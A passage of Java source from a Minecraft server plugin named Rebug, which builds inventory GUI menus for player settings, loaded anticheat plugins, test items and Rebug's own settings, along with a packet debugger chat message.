				item.setItemMeta(itemMeta);
				inventory.setItem(13, item);
				
				item = Reset(Material.EXP_BOTTLE);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Hide All Online Players");
				lore.add(ChatColor.AQUA + "Status: " + (user.HideOnlinePlayers ? ChatColor.GREEN : ChatColor.DARK_RED) + user.HideOnlinePlayers);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Hide/Unhide All Online Players");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(14, item);
				
				item = Reset(Material.IRON_DOOR);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Proximity Player Hider");
				lore.add(ChatColor.AQUA + "Status: " + (user.ProximityPlayerHider ? ChatColor.GREEN : ChatColor.DARK_RED) + user.ProximityPlayerHider);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Hide players that are near you!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(15, item);
				
				item = Reset(Material.BOOK_AND_QUILL);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Direct Messages");
				lore.add(ChatColor.AQUA + "Status: " + (user.AllowDirectMessages ? ChatColor.GREEN : ChatColor.DARK_RED) + user.AllowDirectMessages);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Allow/Disallow Direct Messages");
				lore.add(ChatColor.AQUA + "In Development!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(16, item);


				item = Reset(Material.BED);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Auto Close AntiCheats Menu");
				lore.add(ChatColor.AQUA + "Status: " + (user.AutoCloseAntiCheatMenu ? ChatColor.GREEN : ChatColor.DARK_RED) + user.AutoCloseAntiCheatMenu);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Auto Closing AntiCheat Menu");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(17, item);
				
				
				item = Reset(Material.PAPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + "S08 Alerts");
				lore.add(ChatColor.AQUA + "Status: " + (user.ShowS08Alert ? ChatColor.GREEN : ChatColor.DARK_RED) + user.ShowS08Alert);
				lore.add(ChatColor.AQUA + "Description: " + ChatColor.RESET + "Enable/Disable Alerts for S08");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(18, item);
				
				
				item = Reset(Material.COMMAND);
				itemMeta.setDisplayName(ChatColor.ITALIC + "Client Command Checker");
				lore.add(ChatColor.AQUA + "Status: " + (user.ClientCommandChecker ? ChatColor.GREEN : ChatColor.DARK_RED) + user.ClientCommandChecker);
				lore.add(ChatColor.AQUA + "Description: " + ChatColor.RESET + "Checks if the player is using cheats");
				lore.add(ChatColor.RESET + "by checking if they have client commands like");
				lore.add(ChatColor.RESET + ".say this is easily bypassed");
				lore.add(ChatColor.RESET + "this is done when the player first joins the server!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(19, item);
				
				
				item = Reset(Material.TNT);
				itemMeta.setDisplayName(ChatColor.ITALIC.toString() + ChatColor.BOLD + ChatColor.RED + "REBUG " + ChatColor.RESET + ChatColor.ITALIC + ChatColor.GRAY + "Settings");
				item.setItemMeta(itemMeta);
				inventory.setItem(44, item);
				
				for (int i = 0; i < inventory.getSize(); i ++)
				{
					if (inventory.getItem(i) == null)
					{
						item = Reset(Material.STAINED_GLASS_PANE, 1, (short) 0, (byte) 7);
						itemMeta.setDisplayName(ChatColor.RED + "Add more Settings as i think of them!");
						item.setItemMeta(itemMeta);
						inventory.setItem(i, item);
					}
				}
				user.SettingsMenu = inventory;
			}
			break;

		default:
			break;
		}
	}
	@SuppressWarnings("deprecation")
	@Override
	public void SetUpMenu(String menu) 
	{
		if (PTNormal.isStringNull(menu)) return;
		
		switch (menu.toLowerCase())
		{
		case "anticheats menu":
			if (ItemsAndMenusUtils.AntiCheatMenu == null)
			{
				Inventory inventory = PTNormal.createInventory(this, Rebug.getINSTANCE().getLoadedAntiCheatsFile().getInt("loaded-anticheats.Inventory-size"), ChatColor.RED + "AntiCheats");
				int size = Config.getLoadedAntiCheats().size();
				
				if (size < 1)
					Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Add the AntiCheats to: loaded-anticheats in the config file!");
				
				else
				{
					Menu.TabAntiCheats.clear();
					Menu.TabAntiCheats.add("Vanilla");
					for (Plugin AC : Bukkit.getPluginManager().getPlugins())
					{
						for (int i = 0; i < size; i ++)
						{
							String name = ChatColor.translateAlternateColorCodes('&', Config.getLoadedAntiCheats().get(i));
							name = ChatColor.stripColor(name);
							if (name != null && AC != null && AC.getName().equalsIgnoreCase(name) && !Rebug.anticheats.containsKey(AC))
							{
								if (Rebug.debug)
									Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Adding AntiCheat to list= " + AC.getName());
								
								Menu.TabAntiCheats.add(name);
								Rebug.anticheats.put(AC, name);
							}
						}
					}
				}
				if (!Rebug.anticheats.isEmpty())
				{
					final String[] canbe = {"PacketEvents", "ProtocolLib", "Atlas", "ProtocolSupport", "PacketListenerApi"};
					item = Reset (Material.ENCHANTMENT_TABLE);
					itemMeta.setDisplayName(ChatColor.WHITE + "Info");
					lore.add("");
					lore.add(ChatColor.AQUA + "To select Multiple AntiCheats");
					lore.add(ChatColor.AQUA + "do /ac <anticheat> <anticheat> (....)");
					itemMeta.setLore(lore);
					item.setItemMeta(itemMeta);
					inventory.setItem(Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("custom-info-menu-slot") ? Rebug.getINSTANCE().getLoadedAntiCheatsFile().getInt("info-item-slot") : 0, item);
					
					item = Reset(Material.DIRT);
					itemMeta.setDisplayName(ChatColor.WHITE + "Vanilla");
					lore.add("");
					lore.add(ChatColor.AQUA + "Status: " + (Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("is-vanilla-enabled") ? ChatColor.GREEN + "Enabled" : ChatColor.DARK_RED + "Disabled"));
					lore.add("");
					lore.add(ChatColor.AQUA + "Version: " + ChatColor.WHITE + Rebug.getINSTANCE().getServerVersion()); // Bukkit.getServer().getBukkitVersion()
					lore.add(ChatColor.AQUA + "Author: " + ChatColor.WHITE + "Mojang");
					itemMeta.setLore(lore);
					item.setItemMeta(itemMeta);
					inventory.setItem(Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("custom-vanilla-menu-slot") ? Rebug.getINSTANCE().getLoadedAntiCheatsFile().getInt("vanilla-item-slot") : 1, item);
					
					
					int adding = 2;
					final boolean CustomSlots = Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("Custom Slots");
					for (Map.Entry<Plugin, String> map : Rebug.anticheats.entrySet())
					{
						Plugin AntiCheat = map.getKey();
						String author = "Unknown", name = map.getValue().toLowerCase(), description = AntiCheat.getDescription() != null && AntiCheat.getDescription().getDescription() != null ? AntiCheat.getDescription().getDescription() : null,  version = AntiCheat.getDescription() != null && AntiCheat.getDescription().getVersion() != null ? AntiCheat.getDescription().getVersion() : "Unknown";
						int author_size = 0;
						if (Rebug.debug)
							Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Found AntiCheat: " + name + " " + version);
						
						if (AntiCheat.getDescription() != null && AntiCheat.getDescription().getAuthors() != null && AntiCheat.getDescription().getAuthors().size() > 0)
						{
							author_size = AntiCheat.getDescription().getAuthors().size();
							if (author_size > 1)
							{
								author = "[";
								for (int i = 0; i < AntiCheat.getDescription().getAuthors().size(); i ++)
								{
									author += AntiCheat.getDescription().getAuthors().get(i) + ", ";
								}
								author += "]";
								author = author.replace(", ]", "]").replace("[[", "[").replace("]]", "]").replace(",,", ",");
							}
							else
								author = AntiCheat.getDescription().getAuthors().get(0);
						}
						if (Rebug.getINSTANCE().getLoadedAntiCheatsFile().get ("loaded-anticheats." + name + ".has-data") != null && Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("loaded-anticheats." + name + ".has-data"))
							item = Reset(Material.getMaterial(Config.getAntiCheatItemID(name)), 1, (short) 0, (byte) Config.getItemData(name));
						else
							item = Reset(Material.getMaterial(Config.getAntiCheatItemID(name)));
						
						if (Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("loaded-anticheats." + name + ".enable_enchantment"))
						{
							for (String enchant : Rebug.getINSTANCE().getLoadedAntiCheatsFile().getStringList("loaded-anticheats." + name + ".enchantments"))
							{
								int ID = Integer.valueOf(enchant.split(":")[0]), level = Integer.valueOf(enchant.split(":")[1]);
								Enchantment enchantment = Enchantment.getById(ID);
								if (enchantment == null)
									Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Unknown enchantment in Loaded AntiCheats.yml (AntiCheat= " + name + ") (enchant ID= " + ID + " level= " + level + ")");
								
								else
								{
									item.addUnsafeEnchantment(enchantment, level);
									itemMeta.addEnchant(enchantment, level, true);
								}
							}
						}
						if (Rebug.getINSTANCE().getLoadedAntiCheatsFile().get("loaded-anticheats." + name + ".enable_item_flag") != null && Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("loaded-anticheats." + name + ".enable_item_flag"))
						{
							for (String itemflag : Rebug.getINSTANCE().getLoadedAntiCheatsFile().getStringList("loaded-anticheats." + name + ".ItemFlags")) 
							{
								ItemFlag flag = ItemFlag.valueOf(itemflag);
								if (flag == null)
									Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Unknown ItemFlag in Loaded AntiCheats.yml! (AntiCheat= " + name + " ItemFlag= " + itemflag + ")");
								else
									itemMeta.addItemFlags(flag);
							}
						}
						if (Rebug.getINSTANCE().getLoadedAntiCheatsFile().get("loaded-anticheats." + name + ".unbreakable") != null)
							itemMeta.spigot().setUnbreakable(Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("loaded-anticheats." + name + ".unbreakable"));
						
						itemMeta.setDisplayName(ChatColor.WHITE + AntiCheat.getName());
						lore.add("");
						lore.add(ChatColor.AQUA + "Status: " + (AntiCheat.isEnabled() && Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("loaded-anticheats." + name + ".enabled") ? 
					    ChatColor.GREEN + "Enabled" : ChatColor.DARK_RED + "Disabled"));
						lore.add("");
						lore.add(ChatColor.AQUA + "Version: "+ ChatColor.WHITE + version);
						
						if (author_size > 0)
							lore.add(ChatColor.AQUA + "Author" + (author_size > 1 ? "(s)" : "") + ": "+ ChatColor.WHITE + author);
						else
							lore.add(ChatColor.AQUA + "Author(s) " + ChatColor.WHITE + "Unknown!");
						
						if (Rebug.debug)
							Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "ac= " + name + " description length= " + (description == null ? 0 : description.length()));

						if (description != null)
						{
							if (Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("loaded-anticheats." + name + ".fix-description"))
							{
								int fix = Config.LoadDescriptionFix(name);
								if (fix > 0)
								{
									Iterable<String> result = Splitter.fixedLength(fix).split(description);
									String[] parts = Iterables.toArray(result, String.class);
									for (int i = 0; i < parts.length; i ++)
										lore.add((i == 0 ? ChatColor.AQUA + "Description: " : "") + ChatColor.WHITE + parts[i]);
								}
								else
									lore.add(ChatColor.AQUA + "Failed to fix Description!");
							}
							else
								lore.add(ChatColor.AQUA + "Description: "+ ChatColor.WHITE + description);
						}
						else
							lore.add(ChatColor.AQUA + "Description: "+ ChatColor.WHITE + "None");
						
						if (AntiCheat.getDescription() != null)
						{
							String soft_depend = "", hard_depend = "";
							int soft = AntiCheat.getDescription().getSoftDepend().size(), hard = AntiCheat.getDescription().getDepend().size();
							if (soft > 0)
							{
								if (soft > 1)
								{
									for (int i = 0; i < soft; i ++)
									{
										for (int o = 0; o < canbe.length; o ++)
										{
											if (AntiCheat.getDescription().getSoftDepend().get(i).equalsIgnoreCase(canbe[o]))
												soft_depend += AntiCheat.getDescription().getSoftDepend().get(i) + " ";
										}
									}
								}
								else
								{
									for (int o = 0; o < canbe.length; o ++)
									{
										if (AntiCheat.getDescription().getSoftDepend().get(0).equalsIgnoreCase(canbe[o]))
											soft_depend += AntiCheat.getDescription().getSoftDepend().get(0);
									}
								}
								soft_depend = soft_depend.replace(", ]", "").replace("[[", "").replace("]]", "").replace(",,", "").replace(",", "");
							}
							if (hard > 0)
							{
								if (hard > 1)
								{
									for (int i = 0; i < hard; i ++)
									{
										for (int o = 0; o < canbe.length; o ++)
										{
											if (AntiCheat.getDescription().getDepend().get(i).equalsIgnoreCase(canbe[o]))
												hard_depend += AntiCheat.getDescription().getDepend().get(i) + " ";
										}
									}
								}
								else
								{
									for (int o = 0; o < canbe.length; o ++)
									{
										if (AntiCheat.getDescription().getDepend().get(0).equalsIgnoreCase(canbe[o]))
											hard_depend += AntiCheat.getDescription().getDepend().get(0);
									}
								}
								hard_depend = hard_depend.replace(", ]", "").replace("[[", "").replace("]]", "").replace(",,", "").replace(",", "");
							}
							if (!PTNormal.isStringNull(hard_depend))
							{
								String NewHD = "";
								String[] Split = StringUtils.split(hard_depend);
								if (Split.length > 1)
								{
									for (int i = 0; i < Split.length; i ++)
									{
										NewHD += Split[i] + (i < Split.length - 1 ? ", " : "");
									}
								}
								
								lore.add(ChatColor.AQUA + "Hard Depend: " + ChatColor.WHITE + (PTNormal.isStringNull(NewHD) ? hard_depend : NewHD));
							}
							if (!PTNormal.isStringNull(soft_depend))
							{
								String NewSD = "";
								String[] Split = StringUtils.split(soft_depend);
								if (Split.length > 1)
								{
									for (int i = 0; i < Split.length; i ++)
									{
										NewSD += Split[i] + (i < Split.length - 1 ? ", " : "");
									}
								}
								lore.add(ChatColor.AQUA + "Soft Depend: " + ChatColor.WHITE + (PTNormal.isStringNull(NewSD) ? soft_depend : NewSD));
							}
							if (PTNormal.isStringNull(soft_depend) && PTNormal.isStringNull(hard_depend))
								lore.add(ChatColor.AQUA + "Dependencies: " + ChatColor.WHITE + "None");
						}
						
						if (Rebug.getINSTANCE().getLoadedAntiCheatsFile().get("loaded-anticheats." + name + ".has_extra_lore") != null && Rebug.getINSTANCE().getLoadedAntiCheatsFile().getBoolean("loaded-anticheats." + name + ".has_extra_lore"))
						{
							for (String lores : Rebug.getINSTANCE().getLoadedAntiCheatsFile().getStringList("loaded-anticheats." + name + ".lore"))
								lore.add(ChatColor.translateAlternateColorCodes('&', lores));
						}
						
						itemMeta.setLore(lore);
						item.setItemMeta(itemMeta);
						inventory.setItem(CustomSlots ? Rebug.getINSTANCE().getLoadedAntiCheatsFile().getInt("loaded-anticheats." + name + ".menu-slot") : adding++, item);
					}
				}
				else
				{
					inventory = null;
					Rebug.getINSTANCE().Log(Level.SEVERE, "Failed to create AntiCheats Menu(Rebug.anticheatsloaded was Empty)!");
				}
				ItemsAndMenusUtils.AntiCheatMenu = inventory;
			}
			break;
			
		case "items menu":
			if (ItemsAndMenusUtils.ItemPickerMenu == null)
			{
				final ItemStack deadglass = Rebug.getINSTANCE().getNMS().getMadeItems("%dead_glass%");
				Inventory inventory = PTNormal.createInventory(this, Config.getItemMenuSize(), ChatColor.GREEN + "Items");
				Rebug.getINSTANCE().getLoadedItemsFile().getConfigurationSection("items").getKeys(false).forEach(key -> 
				{
					Material material = Material.getMaterial(key);
					material = material == null || material == Material.AIR ? Material.getMaterial(PTNormal.SubString(key, 0, key.length() - Rebug.getINSTANCE().getLoadedItemsFile().getInt("items." + key + ".numbered"))) : material;
					
					boolean hasData = Rebug.getINSTANCE().getLoadedItemsFile().getBoolean("items." + key + ".hasData");
					if (hasData)
						item = Reset(material, Rebug.getINSTANCE().getLoadedItemsFile().getInt("items." + key + ".amount"), (short) 0, (byte) Rebug.getINSTANCE().getLoadedItemsFile().getInt("items." + key + ".data"));
					else
						item = Reset(material, Rebug.getINSTANCE().getLoadedItemsFile().getInt("items." + key + ".amount"));
				
					if (Rebug.getINSTANCE().getLoadedItemsFile().getString("items." + key + ".display-name") != null)
						itemMeta.setDisplayName(ChatColor.translateAlternateColorCodes('&', Rebug.getINSTANCE().getLoadedItemsFile().getString("items." + key + ".display-name")));

					if (Rebug.getINSTANCE().getLoadedItemsFile().getBoolean("items." + key + ".enable_enchantment"))
					{
						for (String enchant : Rebug.getINSTANCE().getLoadedItemsFile().getStringList("items." + key + ".enchantments"))
						{
							int ID = Integer.valueOf(enchant.split(":")[0]), level = Integer.valueOf(enchant.split(":")[1]);
							Enchantment enchantment = Enchantment.getById(ID);
							if (enchantment == null)
								Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Unknown enchantment in items.yml (key= " + key + ") (enchant ID= " + ID + " level= " + level + ")");
							
							else
							{
								item.addUnsafeEnchantment(enchantment, level);
								itemMeta.addEnchant(enchantment, level, true);
							}
						}
					}
					itemMeta.spigot().setUnbreakable(Rebug.getINSTANCE().getLoadedItemsFile().getBoolean("items." + key + ".unbreakable"));
					
					if (Rebug.getINSTANCE().getLoadedItemsFile().getBoolean("items." + key + ".enable_item_flag")) 
					{
						for (String itemflag : Rebug.getINSTANCE().getLoadedItemsFile().getStringList("items." + key + ".ItemFlag")) 
						{
							ItemFlag flag = ItemFlag.valueOf(itemflag);
							if (flag == null)
								Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Unknown ItemFlag! (key= " + key + " ItemFlag= " + itemflag + ")");
							else
								itemMeta.addItemFlags(flag);
						}
					}
					if (Rebug.getINSTANCE().getLoadedItemsFile().getBoolean("items." + key + ".hasLore"))
					{
						lore.clear();
						for (String lores : Rebug.getINSTANCE().getLoadedItemsFile().getStringList("items." + key + ".Lore"))
						{
							lore.add(ChatColor.translateAlternateColorCodes('&', lores));
						}
						itemMeta.setLore(lore);
					}
						
					item.setItemMeta(itemMeta);
					inventory.setItem(Rebug.getINSTANCE().getLoadedItemsFile().getInt("items." + key + ".slot"), item);
				});

				if (Config.getItemMenuDeleteItem())
				{
					item = getMadeItems("%delete_item%");
					inventory.setItem(Config.getItemMenuSize()-1, item);
				}
				if (Config.getItemMenuDebugItem())
				{
					item = getMadeItems("%debug_item%");
					inventory.setItem(Config.getItemMenuSize()-2, item);
				}
				
				for (int i = 0; i < inventory.getSize(); i ++)
				{
					if (inventory.getItem(i) == null)
						inventory.setItem(i, deadglass);
				}
				ItemsAndMenusUtils.ItemPickerMenu = inventory;
			}
			break;
			
		case "rebug settings":
			if (ItemsAndMenusUtils.getRebugSettingsMenu == null)
			{
				Inventory inventory = PTNormal.createInventory(this, 18, ChatColor.ITALIC.toString() + ChatColor.BOLD + ChatColor.RED + "REBUG " + ChatColor.RESET + ChatColor.ITALIC + ChatColor.GRAY + "Settings");
				item = Reset(Material.COMMAND);
				itemMeta.setDisplayName(ChatColor.ITALIC + ChatColor.RED.toString() + "Back");
				lore.add(ChatColor.AQUA + "Go back!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				inventory.setItem(0, item);
				
				item = Reset(Material.REDSTONE);
				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.debug ? ChatColor.GREEN : ChatColor.RED).toString()  + "Debug");
				item.setItemMeta(itemMeta);
				inventory.setItem(1, item);
				
				item = Reset(Material.PAPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.debugOpOnly ? ChatColor.GREEN : ChatColor.RED).toString()+ "Debug To Ops Only");
				item.setItemMeta(itemMeta);
				inventory.setItem(2, item);
				
				item = Reset(Material.PAPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + ChatColor.RED.toString() + "Reload Config");
				item.setItemMeta(itemMeta);
				inventory.setItem(3, item);
				
				item = Reset(Material.PAPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.KickOnReloadConfig ? ChatColor.GREEN : ChatColor.RED).toString() + "Kick on Reload Config");
				item.setItemMeta(itemMeta);
				inventory.setItem(4, item);
				
				
				item = Reset(Material.DROPPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.PrivatePerPlayerAlerts ? ChatColor.GREEN : ChatColor.RED).toString() + "Per Player Alerts");
				item.setItemMeta(itemMeta);
				inventory.setItem(5, item);
				
				
				item = Reset(Material.WOOL, 1, (short) 0, (byte) 14);
				itemMeta.setDisplayName(ChatColor.ITALIC + ChatColor.RED.toString() + "Reset Scaffold Area");
				item.setItemMeta(itemMeta);
				inventory.setItem(9, item);
				
				item = Reset(Material.RECORD_12);
				itemMeta.setDisplayName(ChatColor.ITALIC.toString() + (Rebug.AutoRefillBlocks ? ChatColor.GREEN : ChatColor.DARK_RED) + "Auto Clear scaffold after place");
				item.setItemMeta(itemMeta);
				inventory.setItem(10, item);
				ItemsAndMenusUtils.getRebugSettingsMenu = inventory;
			}
			break;

		default:
			break;
		}
	}

	@Override
	public Inventory getInventory() {
		return null;
	}
	@SuppressWarnings("deprecation")
	@Override
	public void DebuggerChatMessage (Player player, PacketReceiveEvent e, String toDebug)
	{
		if (PTNormal.isStringNull(toDebug))
			toDebug = "N/A";
		
		int debuggercounter = Rebug.PacketDebuggerPlayers.get(player.getUniqueId());
		TextComponent component = new TextComponent(ChatColor.BOLD.toString() + ChatColor.DARK_GRAY + "| " + ChatColor.RED + "DEBUGGER " + ChatColor.DARK_GRAY + ">> " + "[" + debuggercounter + "] " + e.getPacketName());
		BaseComponent[] baseComponents = new ComponentBuilder(e.getPacketName() + ":\n\n" + toDebug).create();
		HoverEvent hoverEvent = new HoverEvent(HoverEvent.Action.SHOW_TEXT, baseComponents);
		component.setHoverEvent(hoverEvent);
		player.spigot().sendMessage(component); 
		Rebug.PacketDebuggerPlayers.put(player.getUniqueId(), debuggercounter + 1);
	}
}
